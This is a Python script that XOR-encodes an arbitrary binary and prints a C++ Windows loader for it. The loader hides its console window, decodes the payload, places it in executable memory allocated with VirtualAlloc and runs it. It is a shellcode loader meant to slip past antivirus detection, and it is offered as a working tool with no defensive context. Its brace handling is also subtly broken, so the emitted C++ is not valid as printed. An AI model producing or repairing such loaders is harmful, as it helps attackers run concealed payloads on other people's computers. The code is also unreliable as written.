import sys

def xor_encode(filepath, key):
    with open(filepath, 'rb') as f:
        binary_data = f.read()
    
    encoded_data = bytearray()
    for b in binary_data:
        encoded_data.append(b ^ key)
    
    cpp_buffer = "{"
    for b in encoded_data:
        cpp_buffer += "0x{:02x}, ".format(b)
    cpp_buffer = cpp_buffer[:-2] + "};"
    
    return cpp_buffer

filepath = sys.argv[1]
key = 0x12
cpp_buffer = xor_encode(filepath, key)

file = '#include <windows.h>\n' + \
       '#include <iostream>\n' + \
       '\n' + \
       'int main() {{\n' + \
       '    ShowWindow(GetConsoleWindow(), SW_HIDE);\n' + \
       '    char buffer[] = {};\n'.format(cpp_buffer) + \
       '    char tmpBuffer[sizeof buffer];\n' + \
       '    for (int i = 0; i < sizeof buffer; i++) {{ tmpBuffer[i] = buffer[i] ^ 0x12; }};\n' + \
       '    void *exec = VirtualAlloc(0, sizeof tmpBuffer, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n' + \
       '    memcpy(exec, tmpBuffer, sizeof tmpBuffer);\n' + \
       '    ((void(*)())exec)();\n' + \
       '}}'
print(file)
